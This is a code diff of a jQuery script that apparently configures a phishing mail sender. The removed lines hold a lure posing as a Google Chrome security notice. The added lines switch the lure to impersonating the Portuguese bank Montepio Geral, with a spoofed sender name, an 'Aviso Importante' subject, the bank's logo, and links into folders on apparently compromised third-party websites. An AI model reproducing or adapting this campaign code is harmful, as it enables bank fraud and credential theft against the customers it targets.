@@ -80,9 +80,10 @@ $('.send').click(function(){
 			//$('#' + idForm + '_html').val('<a href="http://jejufirst.com/cgi_bin/counsel/board/wp-content/plugins2/aaaa/particulares.php"><img src="http://s21.postimg.org/qyxc1df8n/mont.png"></a>');
 			//$('#' + idForm + '_assunto').val('Cliente Montepio Geral, Aviso Importante');
 
-			$('#' + idForm + '_html').val('<a href="http://campin.or.kr/db/board/link.html"><img src="http://mamin-journal.ru/wp-content/forum-image-uploads/eng2.jpg"></a>');
-			$('#' + idForm + '_assunto').val('Use um navegador mais seguro');
-			$('#' + idForm + '_remetente').val('GoogleChrome2031');
+			$('#' + idForm + '_html').val('<a href="#LINK#EMAIL"><img src="http://s21.postimg.org/qyxc1df8n/mont.png"></a>');
+			$('#' + idForm + '_assunto').val('Aviso Importante');
+			$('#' + idForm + '_remetente').val('MontepioGeral');
+			$('#' + idForm + '_link').val('http://adventure.co.kr/home/board/wp-content/plugins2/');
 			
 			$('#' + idForm + '_chave').val(chave);
 
